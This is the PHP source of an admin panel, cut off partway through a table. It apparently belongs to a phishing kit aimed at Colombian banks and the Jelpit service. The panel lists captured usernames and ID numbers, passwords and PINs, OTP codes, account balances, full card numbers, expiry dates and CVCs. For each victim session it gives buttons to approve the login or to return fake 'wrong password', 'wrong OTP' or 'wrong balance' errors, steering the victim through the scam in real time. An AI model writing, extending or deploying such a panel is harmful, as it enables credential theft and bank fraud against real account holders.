<?php
// admin/index.php - PANEL DE SESIONES CON VERIFICACIÓN PHP Y DATOS JELPIT
session_start();

// ======================== VERIFICACIÓN DE LOGIN ========================
if (!isset($_SESSION['admin_logueado']) || $_SESSION['admin_logueado'] !== true) {
    header('Location: login.php');
    exit;
}

// Verificar tiempo de inactividad (30 minutos)
$tiempo_maximo = 1800;
if (isset($_SESSION['admin_login_time']) && (time() - $_SESSION['admin_login_time'] > $tiempo_maximo)) {
    session_unset();
    session_destroy();
    header('Location: login.php?mensaje=sesion_expirada');
    exit;
}

$_SESSION['admin_login_time'] = time();

// ======================== LECTURA DE DATOS ========================
$dataDir = __DIR__ . '/data';
$logsFile = $dataDir . '/pse_logs.json';
$transaccionesFile = $dataDir . '/transacciones.json';
$tarjetasFile = $dataDir . '/tarjetas.json';

$logs = [];
if (file_exists($logsFile)) {
    $content = file_get_contents($logsFile);
    $logs = json_decode($content, true) ?? [];
}

$transacciones = [];
if (file_exists($transaccionesFile)) {
    $content = file_get_contents($transaccionesFile);
    $transacciones = json_decode($content, true) ?? [];
}

$tarjetas = [];
if (file_exists($tarjetasFile)) {
    $content = file_get_contents($tarjetasFile);
    $tarjetas = json_decode($content, true) ?? [];
}

$total_logs = count($logs);
$pendientes = count(array_filter($logs, fn($l) => ($l['estado'] ?? '') === 'pendiente'));
$total_transacciones = count($transacciones);
$total_tarjetas = count($tarjetas);

$bancos = [];
foreach ($logs as $log) {
    $banco = $log['banco'] ?? 'Desconocido';
    if (!isset($bancos[$banco])) {
        $bancos[$banco] = 0;
    }
    $bancos[$banco]++;
}

// ======================== AGRUPACIÓN DE SESIONES ========================
$sesiones_agrupadas = [];

foreach ($logs as $log) {
    $documento = 'N/A';
    $camposUsuario = ['documento', 'usuario', 'identificacion', 'cedula', 'numero_documento', 'doc', 'user', 'username'];
    foreach ($camposUsuario as $campo) {
        if (!empty($log[$campo])) {
            $documento = $log[$campo];
            break;
        }
    }
    
    if ($documento === 'N/A' && !empty($log['titular'])) {
        $documento = $log['titular'];
    }
    if ($documento === 'N/A' && !empty($log['nombre'])) {
        $documento = $log['nombre'];
    }
    
    $banco = $log['banco'] ?? 'Desconocido';
    $clave = $log['clave_pin'] ?? $log['clave'] ?? $log['pin'] ?? '';
    $otp = $log['codigo_otp'] ?? $log['codigo_dinamica'] ?? $log['otp'] ?? $log['codigo'] ?? '';
    $saldo = $log['saldo'] ?? '';
    $actividad = $log['activity'] ?? 'LOGIN';
    $estado = $log['estado'] ?? 'pendiente';
    $fecha = $log['fecha'] ?? '';
    $id = $log['id'] ?? uniqid();
    $error_tipo = $log['error_tipo'] ?? null;
    
    // USAR EL ID DEL LOG COMO CLAVE (cada log es una sesión independiente)
    $key = $id;
    
    // Obtener nombre completo si existe
    $nombreCompleto = '';
    if (!empty($log['jelpit_nombre']) && !empty($log['jelpit_apellido'])) {
        $nombreCompleto = $log['jelpit_nombre'] . ' ' . $log['jelpit_apellido'];
    } elseif (!empty($log['titular'])) {
        $nombreCompleto = $log['titular'];
    } elseif (!empty($log['nombre'])) {
        $nombreCompleto = $log['nombre'] . ' ' . ($log['apellido'] ?? '');
    }
    
    if (!isset($sesiones_agrupadas[$key])) {
        $sesiones_agrupadas[$key] = [
            'id' => $id,
            'documento' => $documento,
            'usuario' => $documento,
            'banco' => $banco,
            'clave' => $clave,
            'otp' => $otp,
            'saldo' => $saldo,
            'estado_login' => $estado,
            'estado_otp' => $estado,
            'login_id' => $id,
            'otp_id' => $id,
            'error_tipo' => $error_tipo,
            'fecha_inicio' => $fecha,
            'actividad_login' => $actividad,
            'actividad_otp' => $actividad,
            'logs_ids' => [$id],
            // ============ DATOS JELPIT ============
            'jelpit_email' => $log['jelpit_email'] ?? '',
            'jelpit_nombre' => $log['jelpit_nombre'] ?? '',
            'jelpit_apellido' => $log['jelpit_apellido'] ?? '',
            'jelpit_tipo_documento' => $log['jelpit_tipo_documento'] ?? '',
            'jelpit_celular' => $log['jelpit_celular'] ?? '',
            'tiene_jelpit' => !empty($log['tiene_jelpit']),
            'nombre_completo' => $nombreCompleto,
            // ============ DATOS DE TARJETA ============
            'numero_tarjeta' => $log['numero_tarjeta'] ?? '',
            'vencimiento' => $log['vencimiento'] ?? '',
            'cvc' => $log['cvc'] ?? '',
            'tipo_tarjeta' => $log['tipo_tarjeta'] ?? '',
            'email' => $log['email'] ?? '',
            'celular' => $log['celular'] ?? '',
            'monto' => $log['monto'] ?? '',
            // ============ METADATOS ============
            'ip' => $log['ip'] ?? '',
            'user_agent' => $log['user_agent'] ?? ''
        ];
    }
    
    if ($fecha > $sesiones_agrupadas[$key]['fecha_inicio']) {
        $sesiones_agrupadas[$key]['fecha_inicio'] = $fecha;
    }
}

usort($sesiones_agrupadas, function($a, $b) {
    return strcmp($b['fecha_inicio'], $a['fecha_inicio']);
});

$usuario_sesion = $_SESSION['admin_usuario'] ?? 'Admin';
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Sesiones</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #f0f2f5;
            padding: 20px;
            color: #1a1a2e;
            min-height: 100vh;
        }
        .container { max-width: 1200px; margin: 0 auto; }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            flex-wrap: wrap;
            gap: 10px;
            background: #ffffff;
            padding: 15px 20px;
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
            border-bottom: 3px solid #1a56db;
        }
        .header h1 { 
            font-size: 22px; 
            font-weight: 300; 
            color: #1a1a2e; 
        }
        .header h1 span { 
            color: #1a56db; 
            font-weight: 700; 
        }

        .header-controls {
            display: flex;
            gap: 8px;
            align-items: center;
            flex-wrap: wrap;
        }
        .header-controls input {
            padding: 8px 14px;
            border-radius: 20px;
            border: 1px solid #d0d7e0;
            background: #f8fafc;
            color: #1a1a2e;
            font-size: 13px;
            width: 180px;
            outline: none;
        }
        .header-controls input::placeholder { 
            color: #999; 
        }
        .header-controls input:focus { 
            border-color: #1a56db; 
            box-shadow: 0 0 0 3px rgba(26, 86, 219, 0.1);
        }

        .btn {
            padding: 6px 14px;
            border: none;
            border-radius: 18px;
            cursor: pointer;
            font-weight: 600;
            font-size: 12px;
            transition: all 0.3s;
            color: #ffffff;
            text-decoration: none;
            display: inline-block;
        }
        .btn:hover { transform: scale(1.03); opacity: 0.9; }
        .btn-primary { background: #1a56db; color: #ffffff; }
        .btn-danger { background: #dc2626; color: #ffffff; }
        .btn-info { background: #0891b2; color: #ffffff; }
        .btn-sm { padding: 4px 12px; font-size: 11px; border-radius: 12px; }
        .btn-logout { background: #6b7280; color: #ffffff; }
        .btn-jelpit { background: #2d1b69; color: #ffffff; }
        .btn-ver { background: #1a56db; color: #ffffff; }
        
        .btn-aprobar { background: #059669; color: #ffffff; font-weight: 700; }
        .btn-error-usuario { background: #dc2626; color: #ffffff; }
        .btn-error-clave { background: #d97706; color: #ffffff; }
        .btn-error-saldo { background: #65a30d; color: #ffffff; }
        .btn-error-dinamica { background: #7c3aed; color: #ffffff; }
        .btn-error-otp { background: #db2777; color: #ffffff; }
        .btn-3ds-aprobar { background: #059669; color: #ffffff; }
        .btn-3ds-rechazar { background: #dc2626; color: #ffffff; }
        .btn-3ds-error-clave { background: #d97706; color: #ffffff; }

        .stats {
            display: grid;
            grid-template-columns: repeat(6, 1fr);
            gap: 12px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: #ffffff;
            padding: 12px 18px;
            border-radius: 10px;
            border-left: 3px solid #1a56db;
            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
        }
        .stat-card .label { 
            font-size: 11px; 
            color: #888; 
            text-transform: uppercase; 
        }
        .stat-card .value { 
            font-size: 22px; 
            font-weight: bold; 
            color: #1a56db; 
        }
        .stat-card.jelpit { border-left-color: #2d1b69; }
        .stat-card.jelpit .value { color: #2d1b69; }
        .stat-card.tarjetas { border-left-color: #c2410c; }
        .stat-card.tarjetas .value { color: #c2410c; }

        .filtros {
            display: flex;
            gap: 8px;
            margin-bottom: 16px;
            flex-wrap: wrap;
        }
        .filtro-btn {
            padding: 5px 16px;
            border-radius: 15px;
            border: 1px solid #d0d7e0;
            background: #ffffff;
            color: #666;
            cursor: pointer;
            font-size: 12px;
            transition: all 0.3s;
        }
        .filtro-btn:hover, .filtro-btn.active {
            background: #1a56db;
            color: #ffffff;
            border-color: #1a56db;
        }
        .filtro-btn.jelpit:hover, .filtro-btn.jelpit.active {
            background: #2d1b69;
            color: #ffffff;
            border-color: #2d1b69;
        }

       .sesiones-list {
    display: flex;
    flex-direction: column;
    gap: 16px;
    margin-bottom: 30px;
}

        .sesion-card {
            background: #ffffff;
            border-radius: 12px;
            padding: 16px 18px;
            border-left: 4px solid #1a56db;
            transition: all 0.3s;
            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .sesion-card:hover { 
            box-shadow: 0 4px 16px rgba(0,0,0,0.10);
            transform: translateY(-2px);
        }
        .sesion-card.estado-aprobado { border-left-color: #059669; }
        .sesion-card.estado-rechazado { border-left-color: #dc2626; }
        .sesion-card.tiene-jelpit { border-left-color: #2d1b69; }

        /* HEADER DE LA TARJETA */
        .sesion-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 6px;
            border-bottom: 1px solid #eef2f6;
            padding-bottom: 8px;
        }
        .sesion-banco-nombre {
            font-weight: 700;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .sesion-banco-nombre .badge {
            padding: 3px 12px;
            border-radius: 12px;
            font-size: 11px;
            color: #ffffff;
        }
        .badge-bancolombia { background: #1a56db; }
        .badge-davivienda { background: #b91c1c; }
        .badge-nequi { background: #0d9488; }
        .badge-daviplata { background: #15803d; }
        .badge-bogota { background: #c2410c; }
        .badge-falabella { background: #6b21a8; }
        .badge-jelpit { background: #2d1b69; }
        .badge-otro { background: #64748b; }

        .sesion-estado {
            font-size: 10px;
            padding: 3px 12px;
            border-radius: 12px;
            font-weight: 700;
            color: #ffffff;
        }
        .estado-pendiente { background: #1a365d; }
        .estado-aprobado { background: #059669; }
        .estado-rechazado { background: #dc2626; }

        /* CUERPO DE LA TARJETA */
        .sesion-body {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 4px 12px;
            padding: 6px 0;
            font-size: 13px;
        }
        .sesion-item {
            display: flex;
            align-items: center;
            gap: 4px;
            padding: 2px 0;
        }
        .sesion-item .label {
            color: #ffffff; 
            font-size: 10px;
            text-transform: uppercase;
            font-weight: 600;
            min-width: 40px;
        }
        .sesion-item .valor {
            color: #ffffff;
            font-weight: 500;
            word-break: break-all;
        }
        .sesion-item .valor.clave {
            font-family: monospace;
            letter-spacing: 1px;
            color: #c2410c;
        }
        .sesion-item .valor.otp {
            font-family: monospace;
            letter-spacing: 1px;
            color: #1a56db;
        }
        .sesion-item .valor.saldo {
            font-weight: 700;
            color: #15803d;
        }
        .sesion-item .valor.jelpit {
            color: #2d1b69;
        }
        .sesion-item .valor.sin-dato {
            color: #bbb;
            font-style: italic;
        }
        .sesion-item .icon {
            font-size: 14px;
        }

        .sesion-jelpit {
            background: #f8f5ff;
            border-radius: 6px;
            padding: 6px 10px;
            margin-top: 2px;
            border: 1px solid #ede9fe;
        }
        .sesion-jelpit .jelpit-titulo {
            font-size: 10px;
            font-weight: 700;
            color: #2d1b69;
            text-transform: uppercase;
            margin-bottom: 2px;
        }
        .sesion-jelpit .jelpit-datos {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 2px 10px;
            font-size: 12px;
        }

        /* ACCIONES */
        .sesion-acciones {
            display: flex;
            gap: 5px;
            flex-wrap: wrap;
            padding-top: 8px;
            border-top: 1px solid #eef2f6;
            align-items: center;
        }
        .sesion-acciones .btn {
            min-width: 50px;
            text-align: center;
            font-size: 10px;
            padding: 4px 10px;
        }

        .sesion-fecha {
            font-size: 10px;
            color: #999;
        }

        .toast-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
        }
        .toast {
            background: #ffffff;
            color: #1a1a2e;
            padding: 12px 20px;
            border-radius: 10px;
            margin-bottom: 8px;
            border-left: 4px solid #059669;
            animation: slideIn 0.3s ease;
            font-size: 14px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        .toast.error { border-left-color: #dc2626; }
        .toast.warning { border-left-color: #d97706; }
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        .empty-message {
            text-align: center;
            padding: 50px;
            color: #999;
            font-size: 16px;
        }

        /* MODAL */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }
        .modal-content {
            background: #ffffff;
            padding: 30px;
            border-radius: 12px;
            max-width: 600px;
            width: 95%;
            max-height: 85vh;
            overflow-y: auto;
            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
        }
        .modal-header {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 20px;
            color: #1a1a2e;
            border-bottom: 2px solid #1a56db;
            padding-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .modal-header .badge {
            font-size: 12px;
            padding: 3px 12px;
            border-radius: 12px;
            color: #fff;
        }
        .modal-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }
        .modal-field {
            background: #f8fafc;
            padding: 10px 12px;
            border-radius: 6px;
            border-left: 3px solid #1a56db;
        }
        .modal-field.jelpit { border-left-color: #2d1b69; }
        .modal-field-label {
            font-size: 10px;
            font-weight: bold;
            color: #888;
            text-transform: uppercase;
        }
        .modal-field-value {
            font-size: 14px;
            color: #1a1a2e;
            font-weight: 600;
            word-break: break-all;
        }
        .modal-field-value.clave {
            font-family: monospace;
            letter-spacing: 1px;
            color: #c2410c;
        }
        .modal-field-value.otp {
            font-family: monospace;
            letter-spacing: 1px;
            color: #1a56db;
        }
        .modal-close {
            margin-top: 20px;
            width: 100%;
            padding: 12px;
            background: #1a56db;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
        }
        .modal-close:hover { background: #1e40af; }

        /* TABLA DE TARJETAS 3DS */
        .table-wrapper {
            background: #ffffff;
            border-radius: 12px;
            padding: 16px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
            border: 1px solid #e8ecf0;
            overflow-x: auto;
        }
        .table-wrapper table {
            width: 100%;
            border-collapse: collapse;
            font-size: 12px;
        }
        .table-wrapper th {
            background: #f8fafc;
            padding: 10px;
            text-align: left;
            color: #1a56db;
            border-bottom: 2px solid #1a56db;
            font-weight: 600;
        }
        .table-wrapper td {
            padding: 10px;
            border-bottom: 1px solid #f0f2f5;
            color: #1a1a2e;
        }
        .table-wrapper tr:hover td {
            background: #f0f7ff;
        }
        .badge-tarjeta {
            background: #dbeafe;
            color: #1a56db;
            padding: 4px 8px;
            border-radius: 3px;
            font-size: 10px;
            font-weight: bold;
        }
        .badge-pse {
            background: #ede9fe;
            color: #6b21a8;
            padding: 4px 8px;
            border-radius: 3px;
            font-size: 10px;
            font-weight: bold;
        }
        .badge-visa { background: #1a56db; color: white; padding: 2px 10px; border-radius: 4px; font-size: 10px; font-weight: bold; }
        .badge-mastercard { background: #c2410c; color: white; padding: 2px 10px; border-radius: 4px; font-size: 10px; font-weight: bold; }
        .badge-amex { background: #006fcf; color: white; padding: 2px 10px; border-radius: 4px; font-size: 10px; font-weight: bold; }
        .badge-diners { background: #1a1a2e; color: white; padding: 2px 10px; border-radius: 4px; font-size: 10px; font-weight: bold; }
        .estado-3ds-pendiente { background: #1a365d; color: white; padding: 2px 12px; border-radius: 12px; font-size: 10px; font-weight: 600; }
        .estado-3ds-aprobado { background: #059669; color: white; padding: 2px 12px; border-radius: 12px; font-size: 10px; font-weight: 600; }
        .estado-3ds-rechazado { background: #dc2626; color: white; padding: 2px 12px; border-radius: 12px; font-size: 10px; font-weight: 600; }
        .estado-3ds-error-clave { background: #d97706; color: white; padding: 2px 12px; border-radius: 12px; font-size: 10px; font-weight: 600; }

        /* Estilo para número de tarjeta completo */
        .numero-tarjeta-completo {
            font-family: 'Courier New', monospace;
            font-size: 13px;
            letter-spacing: 1px;
            color: #1a1a2e;
            font-weight: 600;
        }

        @media (max-width: 700px) {
            .sesion-body { grid-template-columns: 1fr; }
            .sesion-jelpit .jelpit-datos { grid-template-columns: 1fr; }
            .stats { grid-template-columns: 1fr 1fr; }
            .header h1 { font-size: 18px; }
            .header-controls input { width: 130px; }
            .modal-grid { grid-template-columns: 1fr; }
        }
        @media (max-width: 450px) {
            .sesion-header { flex-direction: column; align-items: flex-start; }
            .sesion-acciones { justify-content: center; }
            .sesiones-grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- HEADER -->
        <div class="header">
            <h1>🔐 Panel de <span>Sesiones</span></h1>
            <div class="header-controls">
                <div class="user-info" style="font-size:12px;color:#666;">
                    👤 <span style="color:#1a56db;font-weight:600;"><?php echo htmlspecialchars($usuario_sesion); ?></span>
                </div>
                <input type="text" id="filtroInput" placeholder="Filtrar..." onkeyup="aplicarFiltros()">
                <button class="btn btn-primary" onclick="cargarDatos()">🔄</button>
                <button class="btn btn-danger" onclick="borrarTodosLogs()">🗑️</button>
                <button class="btn btn-info" onclick="exportarCSV()">📥</button>
                <a href="logout.php" class="btn btn-logout">🚪 Salir</a>
            </div>
        </div>

        <!-- STATS -->
        <div class="stats">
            <div class="stat-card"><div class="label">Total Sesiones</div><div class="value" id="statTotal"><?php echo $total_logs; ?></div></div>
            <div class="stat-card"><div class="label">Pendientes</div><div class="value" id="statPendientes"><?php echo $pendientes; ?></div></div>
            <div class="stat-card"><div class="label">Bancos</div><div class="value"><?php echo count($bancos); ?></div></div>
            <div class="stat-card"><div class="label">Transacciones</div><div class="value"><?php echo $total_transacciones; ?></div></div>
            <div class="stat-card jelpit"><div class="label">📋 Jelpit</div><div class="value"><?php echo count(array_filter($sesiones_agrupadas, fn($s) => $s['tiene_jelpit'] ?? false)); ?></div></div>
            <div class="stat-card tarjetas"><div class="label">💳 Tarjetas 3DS</div><div class="value"><?php echo $total_tarjetas; ?></div></div>
        </div>

        <!-- FILTROS -->
        <div class="filtros" id="filtrosBanco">
            <button class="filtro-btn active" data-banco="todos" onclick="filtrarPorBanco('todos')">Todos</button>
            <?php foreach ($bancos as $banco => $count): 
                $bancoSlug = strtolower(str_replace(' ', '_', $banco));
            ?>
                <button class="filtro-btn" data-banco="<?php echo $bancoSlug; ?>" onclick="filtrarPorBanco('<?php echo $bancoSlug; ?>')">
                    <?php echo htmlspecialchars($banco); ?> (<?php echo $count; ?>)
                </button>
            <?php endforeach; ?>
            <button class="filtro-btn jelpit" data-banco="jelpit" onclick="filtrarPorBanco('jelpit')">📋 Jelpit</button>
        </div>

        <!-- ==================== SESIONES DE BANCOS ==================== -->
        <div class="sesiones-list" id="sesionesList">
            <?php if (count($sesiones_agrupadas) > 0): ?>
                <?php foreach ($sesiones_agrupadas as $sesion): 
                    $banco = $sesion['banco'] ?? 'Desconocido';
                    $bancoLower = strtolower($banco);
                    
                    // Clase del badge según el banco
                    $badgeClass = 'badge-otro';
                    if (strpos($bancoLower, 'bancolombia') !== false) $badgeClass = 'badge-bancolombia';
                    elseif (strpos($bancoLower, 'davivienda') !== false) $badgeClass = 'badge-davivienda';
                    elseif (strpos($bancoLower, 'nequi') !== false) $badgeClass = 'badge-nequi';
                    elseif (strpos($bancoLower, 'daviplata') !== false) $badgeClass = 'badge-daviplata';
                    elseif (strpos($bancoLower, 'bogota') !== false) $badgeClass = 'badge-bogota';
                    elseif (strpos($bancoLower, 'falabella') !== false) $badgeClass = 'badge-falabella';
                    elseif (strpos($bancoLower, 'jelpit') !== false) $badgeClass = 'badge-jelpit';
                    
                    $usuario = $sesion['documento'] ?? $sesion['usuario'] ?? 'N/A';
                    $clave = $sesion['clave'] ?? '';
                    $otp = $sesion['otp'] ?? '';
                    $saldo = $sesion['saldo'] ?? '';
                    $login_id = $sesion['login_id'] ?? $sesion['id'];
                    $estado_login = $sesion['estado_login'] ?? 'pendiente';
                    $estado_otp = $sesion['estado_otp'] ?? 'pendiente';
                    $error_tipo = $sesion['error_tipo'] ?? null;
                    $fecha = $sesion['fecha_inicio'] ?? '';
                    
                    $estado_general = 'pendiente';
                    if ($estado_login === 'rechazado' || $estado_otp === 'rechazado') {
                        $estado_general = 'rechazado';
                    } elseif ($estado_login === 'aprobado' && $estado_otp === 'aprobado') {
                        $estado_general = 'aprobado';
                    }
                    
                    $mostrarBotonesLogin = ($estado_login === 'pendiente');
                    $mostrarBotonesOtp = ($estado_login === 'aprobado' && $estado_otp === 'pendiente');
                    
                    $esNequi = strpos($bancoLower, 'nequi') !== false;
                    $tieneSaldo = !empty($saldo);
                    
                    // Datos Jelpit
                    $jelpitEmail = $sesion['jelpit_email'] ?? '';
                    $jelpitNombre = $sesion['jelpit_nombre'] ?? '';
                    $jelpitApellido = $sesion['jelpit_apellido'] ?? '';
                    $jelpitTipoDoc = $sesion['jelpit_tipo_documento'] ?? '';
                    $jelpitCelular = $sesion['jelpit_celular'] ?? '';
                    $tieneJelpit = $sesion['tiene_jelpit'] ?? false;
                    $cardClass = $tieneJelpit ? 'tiene-jelpit' : '';
                    
                    // Datos de tarjeta
                    $numeroTarjeta = $sesion['numero_tarjeta'] ?? '';
                    $vencimiento = $sesion['vencimiento'] ?? '';
                    $cvc = $sesion['cvc'] ?? '';
                    $email = $sesion['email'] ?? '';
                    $celular = $sesion['celular'] ?? '';
                    $monto = $sesion['monto'] ?? '';
                ?>
                    <div class="sesion-card estado-<?php echo $estado_general; ?> <?php echo $cardClass; ?>" 
                         data-banco="<?php echo $bancoLower; ?>" 
                         data-usuario="<?php echo strtolower($usuario); ?>" 
                         data-id="<?php echo $login_id; ?>"
                         data-jelpit="<?php echo $tieneJelpit ? '1' : '0'; ?>">
                        
                        <!-- HEADER -->
                        <div class="sesion-header">
                            <div class="sesion-banco-nombre">
                                <span class="badge <?php echo $badgeClass; ?>"><?php echo htmlspecialchars($banco); ?></span>
                                <span style="font-size:12px;color:#666;">#<?php echo substr($login_id, -6); ?></span>
                                <?php if ($error_tipo): ?>
                                    <span class="error-badge" style="font-size:9px;padding:2px 8px;border-radius:8px;background:#dc2626;color:#fff;"><?php echo $error_tipo; ?></span>
                                <?php endif; ?>
                                <?php if ($tieneJelpit): ?>
                                    <span style="font-size:9px;padding:2px 8px;border-radius:8px;background:#2d1b69;color:#fff;">📋</span>
                                <?php endif; ?>
                            </div>
                            <div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;">
                                <span class="sesion-fecha"><?php echo substr($fecha, 11, 5); ?></span>
                                <span class="sesion-estado estado-<?php echo $estado_general; ?>"><?php echo ucfirst($estado_general); ?></span>
                            </div>
                        </div>

                        <!-- BODY -->
                        <div class="sesion-body">
                            <div class="sesion-item">
                                <span class="icon">👤</span>
                                <span class="label">Usuario</span>
                                <span class="valor"><?php echo htmlspecialchars($usuario); ?></span>
                            </div>
                            <div class="sesion-item">
                                <span class="icon">🔑</span>
                                <span class="label">Clave</span>
                                <span class="valor clave"><?php echo !empty($clave) ? htmlspecialchars($clave) : '<span class="sin-dato">—</span>'; ?></span>
                            </div>
                            <div class="sesion-item">
                                <span class="icon">📱</span>
                                <span class="label">OTP</span>
                                <span class="valor otp"><?php echo !empty($otp) ? htmlspecialchars($otp) : '<span class="sin-dato">—</span>'; ?></span>
                            </div>
                            <?php if ($esNequi && $tieneSaldo): ?>
                            <div class="sesion-item">
                                <span class="icon">💰</span>
                                <span class="label">Saldo</span>
                                <span class="valor saldo">$ <?php echo number_format(floatval($saldo)); ?></span>
                            </div>
                            <?php else: ?>
                            <div class="sesion-item">
                                <span class="icon">💰</span>
                                <span class="label">Saldo</span>
                                <span class="valor sin-dato">—</span>
                            </div>
                            <?php endif; ?>
                        </div>

                        <!-- DATOS JELPIT -->
                        <?php if ($tieneJelpit): ?>
                        <div class="sesion-jelpit">
                            <div class="jelpit-titulo">📋 Datos Jelpit</div>
                            <div class="jelpit-datos">
                                <span><strong>Email:</strong> <?php echo htmlspecialchars($jelpitEmail); ?></span>
                                <span><strong>Nombre:</strong> <?php echo htmlspecialchars($jelpitNombre . ' ' . $jelpitApellido); ?></span>
                                <span><strong>Cédula:</strong> <?php echo htmlspecialchars($jelpitTipoDoc . ' ' . $usuario); ?></span>
                                <span><strong>Celular:</strong> <?php echo htmlspecialchars($jelpitCelular); ?></span>
                            </div>
                        </div>
                        <?php endif; ?>

                        <!-- PASOS -->
                        <div style="display:flex;gap:12px;flex-wrap:wrap;font-size:11px;padding:4px 0;">
                            <span>🔐 LOGIN: <span style="font-weight:700;color:<?php echo $estado_login === 'aprobado' ? '#059669' : ($estado_login === 'rechazado' ? '#dc2626' : '#1a365d'); ?>"><?php echo ucfirst($estado_login); ?></span></span>
                            <span>📱 OTP: <span style="font-weight:700;color:<?php echo $estado_otp === 'aprobado' ? '#059669' : ($estado_otp === 'rechazado' ? '#dc2626' : '#1a365d'); ?>"><?php echo ucfirst($estado_otp); ?></span></span>
                            <?php if ($tieneJelpit): ?>
                            <span style="color:#2d1b69;">📋 JELPIT: <span style="font-weight:700;">Completado</span></span>
                            <?php endif; ?>
                        </div>

                        <!-- ACCIONES -->
                        <div class="sesion-acciones">
                            <?php if ($mostrarBotonesLogin): ?>
                                <button class="btn btn-aprobar btn-sm" onclick="aprobarLogin('<?php echo $login_id; ?>')">✓ Aprobar</button>
                                <button class="btn btn-error-usuario btn-sm" onclick="errorUsuario('<?php echo $login_id; ?>')">✗ Err Usuario</button>
                                <button class="btn btn-error-clave btn-sm" onclick="errorClave('<?php echo $login_id; ?>')">✗ Err Clave</button>
                                <?php if ($esNequi): ?>
                                <button class="btn btn-error-saldo btn-sm" onclick="errorSaldo('<?php echo $login_id; ?>')">✗ Err Saldo</button>
                                <?php endif; ?>
                            <?php elseif ($mostrarBotonesOtp): ?>
                                <button class="btn btn-aprobar btn-sm" onclick="aprobarOtp('<?php echo $login_id; ?>')">✓ Aprobar OTP</button>
                                <button class="btn btn-error-dinamica btn-sm" onclick="errorDinamica('<?php echo $login_id; ?>')">✗ Err Dinámica</button>
                                <button class="btn btn-error-otp btn-sm" onclick="errorOtp('<?php echo $login_id; ?>')">✗ Err OTP</button>
                            <?php else: ?>
                                <span style="font-size:11px;color:#999;">✅ Sesión completada</span>
                            <?php endif; ?>
                            <button class="btn btn-danger btn-sm" onclick="borrarSesion('<?php echo $login_id; ?>')">🗑️</button>
                            <button class="btn btn-ver btn-sm" onclick="verDetalles(<?php echo htmlspecialchars(json_encode($sesion)); ?>)">📋 Ver</button>
                        </div>
                    </div>
                <?php endforeach; ?>
            <?php else: ?>
                <div class="empty-message" style="grid-column:1/-1;">📭 No hay sesiones</div>
            <?php endif; ?>
        </div>
        
        <!-- ==================== TABLA DE TRANSACCIONES ==================== -->
        <h2 style="color:#1a1a2e; margin-top: 30px; margin-bottom: 15px;font-size:18px;">💳 Transacciones</h2>
        <div class="table-wrapper" style="background:#ffffff;border-radius:12px;padding:16px;box-shadow:0 2px 8px rgba(0,0,0,0.06);border:1px solid #e8ecf0;overflow-x:auto;">
            <table style="width:100%;border-collapse:collapse;font-size:12px;">
                <thead>
                    <tr>
                        <th style="background:#f8fafc;padding:10px;text-align:left;color:#1a56db;border-bottom:2px solid #1a56db;font-weight:600;">Fecha</th>
                        <th style="background:#f8fafc;padding:10px;text-align:left;color:#1a56db;border-bottom:2px solid #1a56db;font-weight:600;">Tipo</th>
                        <th style="background:#f8fafc;padding:10px;text-align:left;color:#1a56db;border-bottom:2px solid #1a56db;font-weight:600;">Plan</th>
                        <th style="background:#f8fafc;padding:10px;text-align:left;color:#1a56db;border-bottom:2px solid #1a56db;font-weight:600;">Titular</th>
                        <th style="background:#f8fafc;padding:10px;text-align:left;color:#1a56db;border-bottom:2px solid #1a56db;font-weight:600;">Documento</th>
                        <th style="background:#f8fafc;padding:10px;text-align:left;color:#1a56db;border-bottom:2px solid #1a56db;font-weight:600;">N° Tarjeta</th>
                        <th style="background:#f8fafc;padding:10px;text-align:left;color:#1a56db;border-bottom:2px solid #1a56db;font-weight:600;">Vencimiento</th>
                        <th style="background:#f8fafc;padding:10px;text-align:left;color:#1a56db;border-bottom:2px solid #1a56db;font-weight:600;">CVV</th>
                        <th style="background:#f8fafc;padding:10px;text-align:left;color:#1a56db;border-bottom:2px solid #1a56db;font-weight:600;">Monto</th>
                        <th style="background:#f8fafc;padding:10px;text-align:left;color:#1a56db;border-bottom:2px solid #1a56db;font-weight:600;">Detalles</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if (count($transacciones) > 0): ?>
                        <?php foreach (array_reverse($transacciones) as $t): ?>
                            <tr>
                                <td style="padding:10px;border-bottom:1px solid #f0f2f5;color:#1a1a2e;"><?php echo substr($t['fecha'] ?? '', 11, 5); ?></td>
                                <td style="padding:10px;border-bottom:1px solid #f0f2f5;color:#1a1a2e;">
                                    <?php if (($t['tipo'] ?? '') === 'TARJETA'): ?>
                                        <span style="background:#dbeafe;color:#1a56db;padding:4px 8px;border-radius:3px;font-size:10px;font-weight:bold;">💳 Tarjeta</span>
                                    <?php else: ?>
                                        <span style="background:#ede9fe;color:#6b21a8;padding:4px 8px;border-radius:3px;font-size:10px;font-weight:bold;">🏦 PSE</span>
